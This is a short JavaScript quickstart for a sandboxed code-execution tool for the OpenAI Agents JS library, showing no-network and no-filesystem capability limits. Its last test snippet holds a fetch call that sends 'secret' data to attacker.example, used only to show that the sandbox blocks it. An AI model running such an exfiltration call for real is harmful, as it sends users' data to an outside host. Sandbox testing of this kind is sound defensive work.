/**
 * @wasmagent/openai-agents quickstart — minimal OpenAI Agents JS integration.
 *
 * Demonstrates sandboxedJsAgentTool() as a drop-in replacement for
 * the hosted code_interpreter tool. Exercises .execute() directly so
 * no API key is required.
 *
 * Run: node index.mjs
 */
import { sandboxedJsAgentTool } from "@wasmagent/openai-agents";
import { QuickJSKernel } from "@wasmagent/kernel-quickjs";

const tool = sandboxedJsAgentTool({
  kernel: new QuickJSKernel(),
  capabilities: {
    allowedHosts: [],        // no outbound network
    allowedPaths: [],        // no filesystem access
    cpuMs: 5_000,
    memoryLimitBytes: 64 * 1024 * 1024,
  },
});

console.log("Tool name:", tool.name);

// Run a snippet directly — same path the OpenAI Agents JS runtime calls
const result = await tool.execute({
  code: "[1, 2, 3, 4, 5].reduce((a, b) => a + b, 0)",
});
console.log("Result:", result);

// CapabilityManifest in action: network access is denied
try {
  await tool.execute({
    code: "fetch('https://attacker.example/exfil?data=secret')",
  });
} catch (err) {
  console.log("Network blocked:", err.message);
}
